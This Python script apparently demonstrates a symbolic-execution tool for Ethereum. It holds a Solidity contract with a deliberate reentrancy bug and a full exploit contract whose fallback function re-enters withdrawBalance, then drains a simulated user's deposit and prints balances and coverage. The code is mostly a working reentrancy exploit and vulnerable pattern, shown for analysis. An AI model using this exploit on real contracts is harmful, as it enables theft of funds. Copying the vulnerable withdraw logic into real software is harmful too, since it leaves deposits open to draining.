from seth import SEthereum,pack_msb
################ Script #######################

seth = SEthereum()
seth.verbosity(0)
#The contract account to analyze
contract_source_code = '''
pragma solidity ^0.4.15;

contract Reentrance {
    mapping (address => uint) userBalance;
   
    function getBalance(address u) constant returns(uint){
        return userBalance[u];
    }

    function addToBalance() payable{
        userBalance[msg.sender] += msg.value;
    }   

    function withdrawBalance(){
        // send userBalance[msg.sender] ethers to msg.sender
        // if mgs.sender is a contract, it will call its fallback function
        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){
           revert();
        }
        userBalance[msg.sender] = 0;
    }   
}
//Function signatures: 
//c0e317fb: addToBalance()
//f8b2cb4f: getBalance(address)
//5fd8c710: withdrawBalance()
'''

exploit_source_code = '''
pragma solidity ^0.4.15;

contract GenericReentranceExploit {
    event Log(address);
    int reentry_reps=10; 
    address vulnerable_contract=0x4141414141414141;
    address owner;
    bytes reentry_attack_string;

    function GenericReentranceExploit(address _vulnerable_contract){
        vulnerable_contract = _vulnerable_contract;
        owner = msg.sender;
        Log(vulnerable_contract);
    }

    function set_vulnerable_contract(address _vulnerable_contract){
        vulnerable_contract = _vulnerable_contract ;
    }

    function set_reentry_attack_string(bytes _reentry_attack_string){
        reentry_attack_string = _reentry_attack_string;
    }

    function set_reentry_reps(int reps){
        reentry_reps = reps;
    }

    function delegate(bytes data) payable{
        // call addToBalance with msg.value ethers
        vulnerable_contract.call.value(msg.value)(data);
    }

    function get_money(){
        suicide(owner);
    }

    function () payable{
        // reentry_reps is used to execute the attack a number of times
        // otherwise there is a loop between withdrawBalance and the fallback function
        if (reentry_reps > 0){
            reentry_reps = reentry_reps - 1;
            vulnerable_contract.call(reentry_attack_string);
        }
    }
}
//Function signatures: 
//0ccfac9e: delegate(bytes)
//b8029269: get_money()
//9d15fd17: set_reentry_attack_string(bytes)
//0d4b1aca: set_reentry_reps(int256)
//beac44e7: set_vulnerable_contract(address)

'''

contract_bytecode = seth.compile(contract_source_code)
exploit_bytecode = seth.compile(exploit_source_code)

attacker_account = seth.create_account(balance=10)
user_account = seth.create_account(balance=1000)


contract_account = seth.create_contract(owner=user_account, 
                                        init=contract_bytecode)

'''
c0e317fb addToBalance()
f8b2cb4f getBalance(address)
5fd8c710 withdrawBalance()'''
''
exploit_account = seth.create_contract(owner=attacker_account, 
                                       init=exploit_bytecode+pack_msb(contract_account))

print "[+] initial world state"
print " attacker_account %x balance: %d"% (attacker_account, seth.world.storage[attacker_account]['balance'])
print " exploit_account %x balance: %d"%  (exploit_account, seth.world.storage[exploit_account]['balance'])
print " user_account %x balance: %d"%  (user_account, seth.world.storage[user_account]['balance'])
print " contract_account %x balance: %d"%  (contract_account, seth.world.storage[contract_account]['balance'])


#User deposits all in contract
seth.transaction(  caller=user_account,
                    address=contract_account,
                    data='\xc0\xe3\x17\xfb',
                    value=1000)
print "[+] user deposited some."

print " attacker_account %x balance: %d"% (attacker_account, seth.world.storage[attacker_account]['balance'])
print " exploit_account %x balance: %d"%  (exploit_account, seth.world.storage[exploit_account]['balance'])
print " user_account %x balance: %d"%  (user_account, seth.world.storage[user_account]['balance'])
print " contract_account %x balance: %d"%  (contract_account, seth.world.storage[contract_account]['balance'])


print "[+] Set reentry attack string"
seth.transaction(  caller=attacker_account,
                        address=exploit_account,
                        data='\x9d\x15\xfd\x17'+pack_msb(32)+pack_msb(4)+'\x5f\xd8\xc7\x10',
                        value=0)

print " attacker_account %x balance: %d"% (attacker_account, seth.world.storage[attacker_account]['balance'])
print " exploit_account %x balance: %d"%  (exploit_account, seth.world.storage[exploit_account]['balance'])
print " user_account %x balance: %d"%  (user_account, seth.world.storage[user_account]['balance'])
print " contract_account %x balance: %d"%  (contract_account, seth.world.storage[contract_account]['balance'])

print "[+] Let attacker deposit some small amount using exploit"
seth.transaction(  caller=attacker_account,
                    address=exploit_account,
                    data='\x0c\xcf\xac\x9e'+pack_msb(32)+pack_msb(4)+'\xc0\xe3\x17\xfb',
                    value=5)

print " attacker_account %x balance: %d"% (attacker_account, seth.world.storage[attacker_account]['balance'])
print " exploit_account %x balance: %d"%  (exploit_account, seth.world.storage[exploit_account]['balance'])
print " user_account %x balance: %d"%  (user_account, seth.world.storage[user_account]['balance'])
print " contract_account %x balance: %d"%  (contract_account, seth.world.storage[contract_account]['balance'])

print "[+] Let attacker extract all  using exploit" 
seth.transaction(  caller=attacker_account,
                    address=exploit_account,
                    data='\x0c\xcf\xac\x9e'+pack_msb(32)+pack_msb(4)+'\x5f\xd8\xc7\x10',
                    value=0)

print " attacker_account %x balance: %d"% (attacker_account, seth.world.storage[attacker_account]['balance'])
print " user_account %x balance: %d"%  (user_account, seth.world.storage[user_account]['balance'])
print " contract_account %x balance: %d"%  (contract_account, seth.world.storage[contract_account]['balance'])

print "[+] There are %d reverted states now"% len(seth.final_state_ids)

print "[+] There are %d alive states now"% (len(seth.running_state_ids) + int(seth.world is not None))

for state_id in seth.running_state_ids:
    seth.report(state_id)

print "[+] Global coverage:"
print seth.coverage(contract_account)



